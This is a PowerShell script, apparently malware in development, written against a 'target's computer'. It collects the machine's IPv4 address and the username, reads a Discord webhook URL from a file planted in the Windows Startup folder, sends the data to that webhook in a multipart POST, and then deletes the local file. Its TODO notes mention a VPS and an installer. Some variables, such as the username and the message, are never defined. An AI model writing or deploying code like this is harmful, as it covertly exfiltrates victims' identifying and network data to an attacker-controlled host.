# None of the files created will be saved on the target's computer
# TODO: Need to implement VPS, Fix textfile format, Make the DiscordWebhook in Installer instead

# Get IPv4 address of the machine
$IPAddressString = "IPv4 Address"
# Use Get-NetAdapter to get network adapter information
$NetworkAdapter = Get-NetAdapter |
    Where-Object { $_.Status -eq "Up" -and $_.PhysicalMediaType -eq "802.3 Ethernet" } |
    Select-Object -First 1

if ($NetworkAdapter -eq $null) {
    Write-Host "No active Ethernet adapter found."
} else {
    $NetworkInterfaceName = $NetworkAdapter.Name
    $IPAddress = (Get-NetIPAddress -InterfaceAlias $NetworkInterfaceName | Where-Object { $_.AddressFamily -eq "IPv4" }).IPAddress
}

if ($IPAddress -eq $null) {
    # If no IP address is found, fall back to using ipconfig
    $IPAddress = ipconfig | Select-String -Pattern $IPAddressString | ForEach-Object { $_.ToString() -split ':' } | ForEach-Object { $_.Trim() } | Select-Object -Last 1
}

# Get the user's profile folder
$UserProfileFolder = [System.Environment]::GetFolderPath([System.Environment+SpecialFolder]::UserProfile)
$StartupDirectory = "AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"

# Define the path to the file containing the Discord webhook URL
$DiscordWebhookURLFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory\DiscordWebhookURL.icu"
# Use Get-Content to read the file and store its content in a variable
$DiscordWebhookURL = Get-Content -Path $DiscordWebhookURLFile

# Create a text file in the user's startup folder
$TextContent = "$IPAddress`n$Username"
$TextFile = Join-Path -Path $UserProfileFolder -ChildPath "$StartupDirectory$Username.icu"
$TextContent | Out-File -FilePath $TextFile

# Define a message (commented out for now)
# $Message = "Message Placeholder"

# Create a multipart form-data payload
$Boundary = [System.Guid]::NewGuid().ToString()
$CRLF = "`r`n"
$Payload = "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"content`"$CRLF$CRLF$Message$CRLF" +
    "--$Boundary$CRLF" +
    "Content-Disposition: form-data; name=`"file`"; filename=`"$Username.txt`"$CRLF" +
    "Content-Type: application/octet-stream$CRLF$CRLF" +
    (Get-Content -Path $TextFile) + $CRLF +
    "--$Boundary--"
# Set the headers for the request
$Headers = @{
    "Content-Type" = "multipart/form-data; boundary=$Boundary"
}

# Send the payload to Discord
Invoke-RestMethod -Uri $DiscordWebhookURL -Method "POST" -Headers $Headers -Body $Payload

# Delete the text file
Remove-Item -Path $TextFile